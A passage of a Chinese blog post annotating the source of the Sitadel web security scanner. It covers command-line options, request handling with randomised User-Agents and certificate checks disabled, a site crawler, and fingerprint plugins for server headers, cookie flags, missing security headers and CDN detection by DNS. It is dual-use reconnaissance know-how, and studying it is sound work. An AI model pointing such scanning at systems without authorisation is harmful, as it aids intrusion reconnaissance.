dest=&#39;redirect&#39;,                            help=&quot;Whether or not the scan should follow redirection&quot;,                            action=&quot;store_true&quot;)            #设定不遵循重定向选项字符串的名字--no-redirect  解析后的参数名称为redirect        parser.add_argument(&quot;--no-redirect&quot;, dest=&#39;redirect&#39;,                            help=&quot;Whether or not the scan should follow redirection&quot;,                            action=&quot;store_false&quot;)            #设定默认遵循重定向        parser.set_defaults(redirect=True)            #设定timeout选项字符串的名字-t,类型为整形        parser.add_argument(&quot;-t&quot;, &quot;--timeout&quot;, type=int, help=&quot;Timeout to set for the scan HTTP requests&quot;)            #设定cookie选项字符串的名字-c        parser.add_argument(&quot;-c&quot;, &quot;--cookie&quot;, help=&quot;Cookie to set for the scan HTTP requests&quot;)            #设定代理选项字符串的名字-p        parser.add_argument(&quot;-p&quot;, &quot;--proxy&quot;, help=&quot;Proxy to set for the scan HTTP requests&quot;)            #设定指纹识别选项字符串的名字-f，nargs读取的指纹识别参数个数为1或多个        parser.add_argument(&quot;-f&quot;, &quot;--fingerprint&quot;, nargs=&#39;+&#39;, help=&quot;Fingerprint modules to activate&quot;)            #设定攻击选项字符串的名字-a，nargs读取的攻击方式参数个数为1或多个        parser.add_argument(&quot;-a&quot;, &quot;--attack&quot;, nargs=&#39;+&#39;, help=&quot;Attack modules to activate&quot;)            #设定配置选项字符串的名字-config，默认为config/config.yml        parser.add_argument(&quot;--config&quot;, help=&quot;Path to the config file&quot;, default=&quot;config/config.yml&quot;)             #设定verbosity选项字符串的名字--v，命令行遇到参数时的动作为存储遇到的次数，默认为0        parser.add_argument(&quot;-v&quot;, &quot;--verbosity&quot;, action=&quot;count&quot;, default=0, help=&quot;Increase output verbosity&quot;)            # 输出版本信息        parser.add_argument(&#39;--version&#39;, action=&#39;version&#39;, version=self.bn.version())        args = parser.parse_args()</code></pre><p>运行扫描必要配置</p><pre><code class="python">class Sitadel(object):    bn = banner.Banner()    ma = manager    url = None    def main(self):       ...省略...        # 验证目标URL        self.url = validator.validate_target(args.url)        # 阅读配置        settings.from_yaml(args.config)        if args.risk is not None:            settings.risk = Risk(args.risk)        # 注册服务数据、日志、输出、请求        Services.register(&quot;datastore&quot;, Datastore(settings.datastore))        Services.register(&quot;logger&quot;, logging.getLogger(&quot;sitadelLog&quot;))        Services.register(&quot;output&quot;, Output())        Services.register(&quot;request_factory&quot;,                          SingleRequest(url=self.url, agent=args.user_agent, proxy=args.proxy, redirect=args.redirect,                                  timeout=args.timeout))        # 显示目标和扫描开始时间        self.bn.preamble(self.url)        # 运行指纹识别模块        self.ma.fingerprints(args.fingerprint,                             args.user_agent,                             args.proxy,                             args.redirect,                             args.timeout,                             self.url,                             args.cookie)        # 运行爬虫程序发现URL        discovered_urls = self.ma.crawler(self.url, args.user_agent)        # 在发现的URL上运行攻击模块        self.ma.attacks(args.attack, self.url, discovered_urls)</code></pre><h2 id="0x03-lib-request-文件夹"><a href="#0x03-lib-request-文件夹" class="headerlink" title="0x03 lib/request 文件夹"></a>0x03 lib/request 文件夹</h2><pre><code>│   ├── request│   │   ├── __init__.py│   │   ├── ragent.py│   │   ├── requestfactory.py│   │   └── request.py</code></pre><p>主要是定义一些跟请求相关的方法/类/功能</p><h3 id="User-Agent：-lib-request-ragent-py"><a href="#User-Agent：-lib-request-ragent-py" class="headerlink" title="User Agent： lib/request/ragent.py"></a>User Agent： lib/request/ragent.py</h3><p>生成随机的 User-Agent。命令行选项<code>wascan.py --ragent</code>开启。</p><pre><code class="python">import random#定义随机User-Agentdef RandomUserAgent():    agents = (        &#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1&#39;,        &#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&#39;,        &#39;Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16&#39;,        &#39;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US&#39;,        &#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)&#39;,        &#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0&#39;,        &#39;Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1&#39;,        &#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0&#39;,        &#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)&#39;,        &#39;Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1&#39;,        &#39;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)&#39;,        &#39;Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01&#39;,        &#39;Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1&#39;,        &#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;,        &#39;Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0&#39;,        &#39;Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0)&#39;    )    #返回agents中的随机一个    return str(agents[random.randint(0, len(agents) - 1)])</code></pre><h3 id="类：lib-request-requestfactory-py"><a href="#类：lib-request-requestfactory-py" class="headerlink" title="类：lib/request/requestfactory.py"></a>类：lib/request/requestfactory.py</h3><p>定义了几种可能出现的不同协议的request：</p><pre><code class="python">class MultipleHTTPRequests:    def __init__(self, url):        self.url = urlclass SingleHTTPRequest:    passclass DNSRequest:    passclass RequestFactory:    def __init__(self):        pass    #**kwargs表示关键字参数，它是一个 dict    def make_multiple_requests(self, **kwargs):        return MultipleHTTPRequests(**kwargs)    def make_single_request(self, **kwargs):        return SingleHTTPRequest(**kwargs)    def make_dns_request(self, **kwargs):        return DNSRequest(**kwargs)</code></pre><h3 id="请求：lib-requests-request-py"><a href="#请求：lib-requests-request-py" class="headerlink" title="请求：lib/requests/request.py"></a>请求：lib/requests/request.py</h3><p>基本请求。包括请求/代理认证，请求，重定向，响应的处理。</p><pre><code class="python">class SingleRequest:    # 接受参数    def __init__(self, **kwargs):        # 获取各项值，保存到kwargs的dict中，后期进一步处理        self.url = None if &quot;url&quot; not in kwargs else kwargs[&quot;url&quot;]        self.agent = &quot;Sitadel&quot; if &quot;agent&quot; not in kwargs else kwargs[&quot;agent&quot;]        self.proxy = None if &quot;proxy&quot; not in kwargs else kwargs[&quot;proxy&quot;]        self.redirect = True if &quot;redirect&quot; not in kwargs else kwargs[&quot;redirect&quot;]        self.timeout = None if &quot;timeout&quot; not in kwargs else kwargs[&quot;timeout&quot;]        self.ruagent = ragent.RandomUserAgent()    # 发送请求    def send(self, url, method=&quot;GET&quot;, payload=None, headers=None, cookies=None):        #请求会话        output = Services.get(&#39;output&#39;)        request = Session()        prepped=self.prepare_request(url,method,payload,headers,cookies)        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)        try:            resp=request.send(                prepped,                timeout=self.timeout,                proxies={                    &#39;http&#39;: self.proxy,                    &#39;https&#39;: self.proxy,                    &#39;ftp&#39;: self.proxy,                },                allow_redirects=self.redirect,                verify=False)            return resp        except RequestException as err:            output.error(&quot;Error while trying to contact the website: \n {0}\n&quot;.format(err))            raise(err)    # 准备的请求 获取各项参数    def prepare_request(self, url, method, payload, headers, cookies):        if payload is None:            payload = {}        if headers is None:            headers = {}        if cookies is not None:            cookies = {cookies: &#39;&#39;}        if &quot;--random-agent&quot; in sys.argv:            headers[&#39;User-Agent&#39;] = self.ruagent        else:            headers[&#39;User-Agent&#39;] = self.agent        # get请求方式处理        if method.upper() == &quot;GET&quot;: # upper() 小写字母转为大写字母            req = Request(                method=method.upper(),                url=url,                headers=headers,                cookies=cookies,            ).prepare() #发送请求之前的额外处理        # post请求方式处理        elif method.upper() == &quot;POST&quot;:            req = Request(                method=method.upper(),                url=url,                data=payload,                headers=headers,                cookies=cookies,            ).prepare()        # 其他请求方式        else:            req = Request(                method=method.upper(),                url=url,                data=payload,                headers=headers,                cookies=cookies,            ).prepare()        #返回所有的req属性字典        return req</code></pre><h2 id="0x04-lib-utils-文件夹"><a href="#0x04-lib-utils-文件夹" class="headerlink" title="0x04 lib/utils 文件夹"></a>0x04 lib/utils 文件夹</h2><p>主要是定义一些小功能、小工具</p><pre><code>│   └── utils│       ├── banner.py│       ├── container.py│       ├── datastore.py│       ├── __init__.py│       ├── manager.py│       ├── output.py│       └── validator.py</code></pre><h3 id="工具显示的baner：lib-utils-banner-py"><a href="#工具显示的baner：lib-utils-banner-py" class="headerlink" title="工具显示的baner：lib/utils/banner.py"></a>工具显示的baner：lib/utils/banner.py</h3><pre><code class="python">#定义Banner类class Banner:    r = Fore.RED    y = Fore.YELLOW    ny = Fore.YELLOW    nw = Fore.WHITE    g = Fore.GREEN    e = Style.RESET_ALL    #定义banner形状和字体颜色    def banner(self):        print(self.ny + &quot;   _   _   _        ______ _                 _       _  &quot; + self.e)        print(self.ny + &quot;  | |_| |_| |      / _____|_)  _            | |     | | &quot; + self.e)        print(self.ny + &quot;  |         |     ( (____  _ _| |_ _____  __| |_____| | &quot; + self.e)        print(self.ny + &quot;  |    _    |      \____ \| (_   _|____ |/ _  | ___ | | &quot; + self.e)        print(self.ny + &quot;  |   |_|   |      _____) ) | | |_/ ___ ( (_| | ____| | &quot; + self.e)        print(self.ny + &quot;  |         |     (______/|_|  \__)_____|\____|_____)\_)&quot; + self.r + &quot; &quot; + version + &quot;\n&quot; + self.e)        print(self.g + &quot;~/#&quot; + self.e + &quot; Sitadel - Web Application Security Scanner&quot; + self.g + &quot; #\\~&quot; + self.e)        print(self.g + &quot;~/#&quot; + self.e + &quot; Shenril (@shenril)&quot; + self.g + &quot; #\\~&quot; + self.e)        print(self.g + &quot;~/#&quot; + self.e + &quot; https://github.com/shenril/Sitadel&quot; + self.g + &quot; #\\~&quot; + self.e)        print(&quot;\n\n&quot;)    #前言    def preamble(self, url):        print(&#39;URL: %s&#39; % url)        print(&#39;Started: %s&#39; % (time.strftime(&#39;%d/%m/%Y %H:%M:%S&#39;)))#返回以可读字符串表示的当地时间    def version(self):        return self.g + &quot;~/#&quot; + self.e + &quot; Sitadel (&quot; + version + &quot;)\n&quot;</code></pre><h3 id="container-py"><a href="#container-py" class="headerlink" title="container.py"></a>container.py</h3><p>定义Services类，获取cls、key参数</p><pre><code class="python">class Services(object):    services = {}    @classmethod    def get(cls, key):        #异常处理，如果服务是空报错        try:            if cls.services[key] is None:                raise NameError(&quot;No service registered with this name&quot;)            else:                return cls.services[key]        except KeyError:            raise NameError(&quot;No service registered with this name&quot;)    @classmethod    def register(cls, name, instance) -&gt; None:        cls.services[name] = instance</code></pre><h3 id="datastore-py"><a href="#datastore-py" class="headerlink" title="datastore.py"></a>datastore.py</h3><p>用于访问插件数据的公共文件夹的实用程序</p><pre><code class="python">import osclass Datastore:    def __init__(self, rootpath):        self.rootpath = rootpath    #python跨路径调用/lib/data/字典文件    def open(self, filename, mode):        return open(os.path.join(self.rootpath, filename), mode,encoding=&quot;utf-8&quot;)</code></pre><h3 id="manage-py"><a href="#manage-py" class="headerlink" title="manage.py"></a>manage.py</h3><pre><code class="python">#指纹识别传递参数def fingerprints(modules, agent, proxy, redirect, timeout, url, cookie):    plugins = settings.fingerprint_plugins    if modules is not None:        plugins = modules    Fingerprints(        agent=agent,        proxy=proxy,        redirect=redirect,        timeout=timeout,        url=url,        cookie=cookie    ).run(plugins)#获取爬虫urldef crawler(start_url, agent):    return crawl(start_url, agent)#调用plugins攻击执行def attacks(modules, url, crawled_urls):    plugins = settings.attack_plugins    if modules is not None:        plugins = modules    Attacks(url, crawled_urls).run(plugins)</code></pre><h3 id="output-py"><a href="#output-py" class="headerlink" title="output.py"></a>output.py</h3><p>定义了各种打印输出方法，基本的格式化字符串、颜色。略过</p><h3 id="validator-py"><a href="#validator-py" class="headerlink" title="validator.py"></a>validator.py</h3><pre><code class="python">import sysfrom urllib.parse import urlparse#验证url是否有效def validate_target(url):    try:        u = urlparse(url)        #判断协议与域名        if u.scheme and u.netloc:            return u.geturl()#geturl方法获取真实的url        else:            raise ValueError(&#39;Url not valid, please try with a valid target url!&#39;)    except ValueError as e:        print(e)        sys.exit(2)</code></pre><h2 id="0x05-lib-config"><a href="#0x05-lib-config" class="headerlink" title="0x05 lib/config"></a>0x05 lib/config</h2><h3 id="settings-py"><a href="#settings-py" class="headerlink" title="settings.py"></a>settings.py</h3><p>基本设置</p><pre><code class="python">import os.pathfrom enum import IntEnumimport yamlclass Risk(IntEnum):    &quot;&quot;&quot;    枚举插件的风险    0 NO_DANGER几乎没有检测到的风险    1 NOISY生成可能检测到的大量请求和模式    2危险进行开发阶段，可能对目标有潜在危害    &quot;&quot;&quot;    NO_DANGER = 0    NOISY = 1    DANGEROUS = 2#定义settings类class Settings(object):    cfg = {}    _setters = [&#39;risk&#39;, &#39;dns_resolver&#39;, &#39;datastore&#39;]    def __getattr__(self, item):        return Settings.cfg[item]    def __setattr__(self, key, value):        if key in Settings._setters:            Settings.cfg[key] = value        else:            raise NameError(&quot;You cannot redefine the value of %s dynamically\nPlease use the config file&quot; % key)    @classmethod    def from_yaml(cls, filepath):        &quot;&quot;&quot;        从yaml文件生成配置字典        ：param filepath：配置文件路径        ：return：无        &quot;&quot;&quot;        # 检查提供的文件路径是否存在        if not os.path.isfile(filepath):            raise FileNotFoundError(&quot;Invalid path for the configuration file&quot;)        # 解析配置并将其合并到dict中        with open(filepath, &#39;r&#39;) as yamlfile:            try:                # 从文件中获取配置                config = yaml.load(yamlfile)                # 合并字典并获得结果                cls.cfg = {**cls.cfg, **config}            except yaml.YAMLError as e:                print(e)</code></pre><h2 id="0x06-lib-modules"><a href="#0x06-lib-modules" class="headerlink" title="0x06 lib/modules/"></a>0x06 lib/modules/</h2><h3 id="init-py"><a href="#init-py" class="headerlink" title="__init__.py"></a><code>__init__.py</code></h3><pre><code class="python">class IPlugin(type):    def __init__(cls, name, bases, dct):        #判断cls是否不包含plugins属性        if not hasattr(cls, &#39;plugins&#39;):            # 一个基类，创建一个空注册表            cls.plugins = []        else:            # 这是派生类，将cls添加到注册表            if hasattr(cls, &#39;level&#39;) and getattr(cls, &#39;level&#39;) &lt;= settings.risk:                cls.plugins.append(cls)        #调用父类方法        super(IPlugin, cls).__init__(name, bases, dct)</code></pre><h3 id="crawler"><a href="#crawler" class="headerlink" title="crawler"></a>crawler</h3><p>爬虫，爬取页面上的所有连接。</p><pre><code>│   │   ├── crawler│   │   │   ├── crawler.py│   │   │   └── __init__.py</code></pre><h4 id="爬虫：lib-crawler-crawler-py"><a href="#爬虫：lib-crawler-crawler-py" class="headerlink" title="爬虫：lib/crawler/crawler.py"></a>爬虫：lib/crawler/crawler.py</h4><pre><code class="python">urls = []#爬虫类SitadelSpider，它继承自CrawlSpider类class SitadelSpider(CrawlSpider):    name = &quot;sitadel&quot;    #定义规则    rules = [        Rule(            LinkExtractor(                canonicalize=True,                unique=True            ),            follow=True,            callback=&quot;parse_items&quot;        )    ]    # 解析项目的方法    def parse_items(self, response):        links = LinkExtractor(canonicalize=True, unique=True).extract_links(response)        # 对于links中的所有链接        for link in links:            #对于允许的域名allowed_domains中所有的域名            for allowed_domain in self.allowed_domains:                #判断拆分url的netloc是否等于所允许的域名                if urlparse(link.url).netloc == allowed_domain:                    urls.append(link.url)                    #yield 是一个类似 return的关键字，迭代一次遇到yield时就返回yield后面爬虫下来的url                    yield scrapy.Request(link.url, callback=self.parse)#定义crawl函数，传入url和user-agentdef crawl(url, user_agent):    output = Services.get(&#39;output&#39;)    # 爬虫工具的设置    settings = get_project_settings()    settings.set(&quot;USER_AGENT&quot;, user_agent)    settings.set(&quot;LOG_LEVEL&quot;, &quot;CRITICAL&quot;)    # 创建将执行爬虫的进程    output.info(&#39;Start crawling the target website&#39;)    process = CrawlerProcess(settings)    domain = urlparse(url).hostname    process.crawl(SitadelSpider, start_urls=[str(url)], allowed_domains=[str(domain)])    process.start()    # 清理结果    clean_urls = []    for u in urls:        try:            new_url = urlparse(u).geturl()            if new_url not in clean_urls:                clean_urls.append(new_url)        except ValueError:            continue    return clean_urls</code></pre><h2 id="0x07-lib-modules-fingerprints"><a href="#0x07-lib-modules-fingerprints" class="headerlink" title="0x07 lib/modules/fingerprints"></a>0x07 lib/modules/fingerprints</h2><p>指纹识别模式</p><p>目前针对Web应用指纹识别的研究工作主要通过对大量HTML数据的分析来识别Web应用, 包括HTML源码关键字和特殊文件及路径, 由于需要处理较多HTML数据和文件, 降低了其执行速度; 而主流工具主要利用HTML源码关键字实现Web应用的快速识别, 但是由于关键字易被删除而导致识别率低.</p><p>为解决Web应用指纹识别的研究工作与实际应用中存在的上述问题, 并提高Web应用的识别率, 本文以主流的开源Web应用[<a href="http://html.rhhz.net/ZGKXYDXXB/20160516.htm#b15" target="_blank" rel="external">15</a>]为研究对象, 以源码审计为研究方法, 通过对Web应用的静态文件、源码以及结构设计的详细分析, 并从以下4个方面选取Web应用指纹.</p><p>1)结构特征. Web应用的类型可由其特殊的结构设计准确识别, 该指纹只需从HTML数据的头部获取. 例如, 如果Web应用的文件路径包含/wp-includes/, 则该Web应用是Wordpress.</p><p>2)静态文件. Web应用的类型及版本可由其未被修改而被直接使用的静态文件准确识别. 例如, 用于Web应用前端布局的文件style.css, 通过与目标style.css比较可准确识别Web应用的类型及版本.</p><p>3)Cookie设计. Web应用的类型可由开发者为其设计特殊的Cookie名准确识别. 例如, 如果Cookie名为django, 则该Web应用是Django-CMS.</p><p>4)关键字. HTML源码关键字是主流工具选取的Web应用指纹, 存在与功能无关且易被删除的缺点, 但可作为Web应用的补充指纹. 通过对关键字在HTML源码中的分析, 选取以下4个关键字指纹:</p><pre><code>·&lt;meta name=&quot;generator&quot; content=&quot;*application*&quot; /&gt;·Powered by *application*·&lt;meta name=&quot;author&quot; content=&quot;*author*&quot; /&gt;·&lt;meta name=&quot;copyright&quot; content=&quot;*copyright*&quot; /&gt;</code></pre><p>其中, 结构特征、静态文件和Cookie设计这3类指纹都与Web应用功能相关, 有不易被修改或删除的特点, 我们设计并构建了包含这4类Web应用指纹的Web指纹库, 只需按照Web指纹库定义的格式向其中增加新类型Web指纹, 即可实现对新增Web应用的识别, 对Web应用的识别具有良好的可扩展性.</p><h3 id="init-py-1"><a href="#init-py-1" class="headerlink" title="_init_.py"></a><code>_init_.py</code></h3><p><code>_init_.py</code>代码中<code>Fingerprint</code>类如下：</p><pre><code class="python">class FingerprintPlugin(metaclass=IPlugin):    #指纹模块的默认风险等级为NO DANGER，因为它仅分析一个请求响应    level = Risk.NO_DANGER    def process(self, headers, content):        raise NotImplementedError(str(self) + &quot;: Process method not found&quot;)    def __repr__(self):        parent_module = self.__class__.__module__.split(&#39;.&#39;)[-2]        return parent_module.title()class Fingerprints:    def __init__(self, agent, proxy, redirect, timeout, url, cookie):        # 相关参数 初始化        self.url = url        self.cookie = cookie        self.output = Services.get(&#39;output&#39;)        self.request = Services.get(&#39;request_factory&#39;)    def run(self, plugins_activated):        self.output.info(&#39;Launching fingerprints modules...&#39;)        # 从配置中注册插件        for p in plugins_activated:            #            currentdir = os.path.dirname(os.path.realpath(__file__))            pkgpath = os.path.dirname(currentdir + &quot;/%s/&quot; % p)            modules = [name for _, name, _ in pkgutil.iter_modules([pkgpath])]            for module in modules:                importlib.import_module(&quot;.{pkg}.{mod}&quot;.format(pkg=p, mod=module), __package__)        try:            # 发送侦听请求            # 首先发送HTTP GET请求            resp = self.request.send(                url=self.url,                method=&quot;GET&quot;,                payload=None,                headers=None,                cookies=self.cookie            )            # 循环遍历将结果传递到指纹模块上进行处理            fingerprints = (                [(p(), p().process(resp.headers, resp.text)) for p in FingerprintPlugin.plugins])            # 显示每个模块类别的结果            for category, result in fingerprints:                if result is not None:                    self.output.finding(&#39;{category} detected: {result}&#39;.format(category=category, result=result))        except Exception as e:            self.output.error(&quot;Error occured\nAborting fingerprint...\n&quot;)            return</code></pre><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>指纹识别模式服务开启 ，代码重点server类如下</p><pre><code class="python">#定义Server类 传入指纹识别插件class Server(FingerprintPlugin):    def process(self, headers, content):        server = None        try:            for item in headers.items():                if re.search(r&#39;server&#39;, item[0], re.I):                    server = item[1]            # FIXME修复对请求URL的访问            # if server is None:            #     resp = Request().send(Request().url, headers={&#39;Expect&#39;: &#39;Linguini&#39;})            #     for item in resp.headers.items():            #         if re.search(r&#39;server&#39;, item[0], re.I): server = item[1]            return server        except Exception as e:            print(e)</code></pre><h3 id="header"><a href="#header" class="headerlink" title="header"></a>header</h3><h4 id="cookie-py"><a href="#cookie-py" class="headerlink" title="cookie.py"></a>cookie.py</h4><pre><code class="python">class Cookie(FingerprintPlugin):    def process(self, headers, content):        #如果被测url的header存在set-cookie，那么取过来放在cookie变量中        if &#39;set-cookie&#39; in headers:            cookie = headers[&#39;set-cookie&#39;]        else:            cookie = None        #如果cookie不为空        if cookie is not None:            #如果cookie中存在domain=*，输出cookie中匹配到的domain=(.+?)[\;]            if re.search(r&#39;domain=\S*&#39;, cookie, re.I):                Output().finding(                    &#39;Cookies are only accessible to this domain: %s&#39; % re.findall(r&#39;domain=(.+?)[\;]&#39;, cookie, re.I)[0])            #如果在cookie中未找到httponly则提示cookie创建时没有使用hhtponly技术            if not re.search(&#39;httponly&#39;, cookie, re.I):                Output().finding(&#39;Cookies created without HTTPOnly Flag.&#39;)            if not re.search(&#39;secure&#39;, cookie, re.I):                Output().finding(&#39;Cookies created without Secure Flag.&#39;)</code></pre><h4 id="headers-py"><a href="#headers-py" class="headerlink" title="headers.py"></a>headers.py</h4><pre><code class="python">#定义header类，传入指纹识别插件的参数class Headers(FingerprintPlugin):      #定义process函数    def process(self, headers, content):      #将各个请求header头字典作为list存入fields参数        fields = (&#39;Accept&#39;,                  &#39;Accept-Charset&#39;,                  &#39;Accept-Encoding&#39;,                  略。。。。。。                  &#39;X-UA-Compatible&#39;                  )        #如何在headers的key中找到X-Frame-Options则输出提示        if not re.search(r&#39;X-Frame-Options&#39;, str(headers.keys()), re.I):            Output().finding(&#39;X-Frame-Options header is not present.&#39;)        if not re.search(r&#39;Strict-Transport-Security&#39;, str(headers.keys()), re.I):            Output().finding(&#39;Strict-Transport-Security header is not present.&#39;)        if not re.search(r&#39;x-xss-protection&#39;, str(headers.keys()), re.I):            Output().finding(&#39;X-XSS-Protection header is not present.&#39;)        try:            #循环遍历key 如果实际情况key都不在扫描器存储的字典key中，则输出提示不在文件中            for key in headers.keys():                if key not in fields:                    Output().finding(&#39;Uncommon header &quot;%s&quot; found, with contents: %s&#39; % (key, headers[key]))        except Exception as e:            print(e)</code></pre><h3 id="cdn指纹识别"><a href="#cdn指纹识别" class="headerlink" title="cdn指纹识别"></a>cdn指纹识别</h3><h4 id="cdn基础"><a href="#cdn基础" class="headerlink" title="cdn基础"></a>cdn基础</h4><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20190223145924.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20190223150037.png" alt=""></p><p>接下来我们通过图解来看一下当访问<a href="http://www.apple.com/" target="_blank" rel="external">http://www.apple.com</a>  时，apple主页通过CDN获取html页面的全过程</p><p><img src="http://static.oschina.net/uploads/space/2014/0408/223609_7o3z_1452390.png" alt="img"></p><p>(1) 用户向电信运营商的本地DNS递归查询服务器（以下简称local telcom DNS）询问 <a href="http://www.apple.com/" target="_blank" rel="external">www.apple.com</a>  的ip地址。</p><p>(2,3) local telcom DNS向根域名服务器和.com顶级域名服务器进行递归查询apple.com的权威域名服务器地址。</p><p>(4,5) local telcom DNS向apple.com权威域名服务器查询<a href="http://www.apple.xn--comip%2Cakamaicname:e3191-3y32bu50azz7espbb62cuf3kna9319n.dscc.akamaiedge.net/" target="_blank" rel="external">www.apple.com</a> 的ip，得到指向Akamai域名的CNAME记录：<a href="http://www.isg-apple.com.akadns.net/" target="_blank" rel="external">www.isg-apple.com.akadns.net</a>，该域名由Akamai拥有。接着local telcom DNS向<a href="http://www.isg-apple.com.akadns.net/" target="_blank" rel="external">www.isg-apple.com.akadns.net</a>发起DNS查询请求，得到另一个CNAME记录 <a href="http://www.apple.com.edgekey.net/" target="_blank" rel="external">www.apple.com.edgekey.net</a> ，该域名同样由Akamai拥有。和上一步一样，接着local telcom DNS向<a href="http://www.apple.com.edgekey.net/" target="_blank" rel="external">www.apple.com.edgekey.net</a> 发起域名查询请求，得到另一个CNAME记录 <a href="http://www.dscc.akamaiedge.net/" target="_blank" rel="external">e3191.dscc.akamaiedge.net</a> ,该域名还是由Akamai拥有（akadns.net, edgekey, akamaiedge.net 都是Akamai控制的域名）。（由上面的dig截图我们知道，<a href="http://www.dscc.akamaiedge.net/" target="_blank" rel="external">e3191.dscc.akamaiedge.net</a> 是最后一次CNAME记录的域名，也是akamai的智能DNS服务器，它能根据用户所处的地理位置和当前网络负载情况给出最合适的服务器ip地址。）</p><p>(6,7) local telcom DNS向根域名服务器和.net顶级域名服务器进行递归查询akamaiedge.net的权威域名服务器地址。</p><p>(8,9) lcoal telcom DNS向akamaiedge.net的权威域名服务器查询<a href="http://www.dscc.akamaiedge.net/" target="_blank" rel="external">e3191.dscc.akamaiedge.net</a> 的ip,  得到的返回结果为Akamai CDN edge server的ip，一般是离用户地理位置最近的那个edge server服务器。</p><p>(10) local telcom DNS将Akamai CDN edge server的ip返回给用户的计算机。</p><p>(11) 用户向Akamai CDN edge server发送请求。</p><p>(12) Akamai CDN edge server会进行判断：如果是静态资源请求且缓存已经过期，或者是动态资源请求，会向apple源服务器发送请求，否则直接转到（13）。</p><p>(13) Akamai CDN edge server将缓存的静态资源或者作为代理转发的动态资源返回给用户。</p><p>我们平时看到的对CDN的使用基本就是按照上图的流程来进行的。</p><h4 id="akamai"><a href="#akamai" class="headerlink" title="akamai"></a>akamai</h4><p> 域名拼接上edgekey.net(akamai独有)，如果A记录存在，A记录解析成功，说明这个域名存在有CDN，若不存在则无cdn。</p><pre><code class="python">from urllib.parse import urlparsefrom dns.resolver import NXDOMAIN, NoAnswer, Resolver, Timeoutfrom lib.config import settingsfrom lib.config.settings import Riskfrom lib.modules.fingerprints import FingerprintPluginfrom lib.utils.container import Services#定义Akamai类class Akamai(FingerprintPlugin):    level = Risk.NO_DANGER    def process(self, headers, content):        request = Services.get(&#39;request_factory&#39;)        hostname = urlparse(request.url).hostname        try:            resolver = Resolver(configure=False)            resolver.nameservers = [settings.dns_resolver]            resolver.timeout = 2            resolver.lifetime = 2            #dns询问指定查询类型为A记录             dns_query = resolver.query(hostname + &quot;.edgekey.net&quot;, &#39;A&#39;)            #域名解析正确且至少要返回一个IP，则判断是Akamai CDN            if len(dns_query) &gt; 0:                return &quot;Akamai CDN&quot;        except NXDOMAIN:            pass        except NoAnswer:            pass        except Timeout:            pass</code></pre><h4 id="azure-py"><a href="#azure-py" class="headerlink" title="azure.py"></a>azure.py</h4><p>DNS解析CNAME 记录的查询是否存在<code>azureedge.net</code></p><pre><code class="python">class Azure(FingerprintPlugin):    level = Risk.NO_DANGER    def process(self, headers, content):        request = Services.get(&#39;request_factory&#39;)        hostname = urlparse(request.url).hostname        _ = False        try:            resolver = Resolver(configure=False)            resolver.nameservers = [settings.dns_resolver]            resolver.timeout = 2            resolver.lifetime = 2            dns_query = resolver.query(hostname, &#39;CNAME&#39;)            if len(dns_query) &gt; 0:                for answer in dns_query:                    #扫描answer字符串中azureedge.net，r代表了原字符串不用加转义字符，re.I 忽略大小写                     #search是在整体搜索，而match是从开始搜索                    _ |= re.search(r&#39;azureedge\.net&#39;, str(answer), re.I) is not None            #如果成功判断是Azure  cdn            if _:                return &quot;Azure CDN&quot;        except NoAnswer:            pass        except NXDOMAIN:            pass        except Timeout:            pass</code></pre><h4 id="cloudflare-py"><a href="#cloudflare-py" class="headerlink" title="cloudflare.py"></a>cloudflare.py</h4><p> 域名拼接上.cdn.cloudflare.net(cloudflare独有)，如果A记录存在，A记录解析成功，说明这个域名存在有cloudflare CDN</p><pre><code class="python">class Cloudflare(FingerprintPlugin):    level = Risk.NO_DANGER    def process(self, headers, content):        request = Services.get(&#39;request_factory&#39;)        hostname = urlparse(request.url).hostname        try:            resolver = Resolver(configure=False)            resolver.nameservers = [settings.dns_resolver]            resolver.timeout = 2            resolver.lifetime = 2            # 域名拼接上.cdn.cloudflare.net，查询A记录            dns_query = resolver.query(hostname + &quot;.cdn.cloudflare.net&quot;, &#39;A&#39;)            #域名解析正确且至少要返回一个IP，则判断是Akamai CDN            if len(dns_query) &gt; 0:                return &quot;Cloudflare CDN&quot;</code></pre><h4 id="cloudfront-py"><a href="#cloudfront-py" class="headerlink" title="cloudfront.py"></a>cloudfront.py</h4><p>请求hostname查看cname返回包中师傅存在cloudfront.net</p><pre><code class="python">class CloudFront(FingerprintPlugin):    level = Risk.NO_DANGER    def process(self, headers, content):        request = Services.get(&#39;request_factory&#39;)        hostname = urlparse(request.url).hostname        _ = False        try:            resolver = Resolver(configure=False)            resolver.nameservers = [settings.dns_resolver]            resolver.timeout = 2            resolver.lifetime = 2            #            dns_query = resolver.query(hostname, &#39;CNAME&#39;)            if len(dns_query) &gt; 0:                #扫描answer字符串中cloudfront.net                for answer in dns_query:                    _ |= re.search(r&#39;cloudfront\.net&#39;, str(answer), re.I) is not None            if _:                return &quot;CloudFront CDN (Amazon)&quot;</code></pre><h4 id="fastly-py"><a href="#fastly-py" class="headerlink" 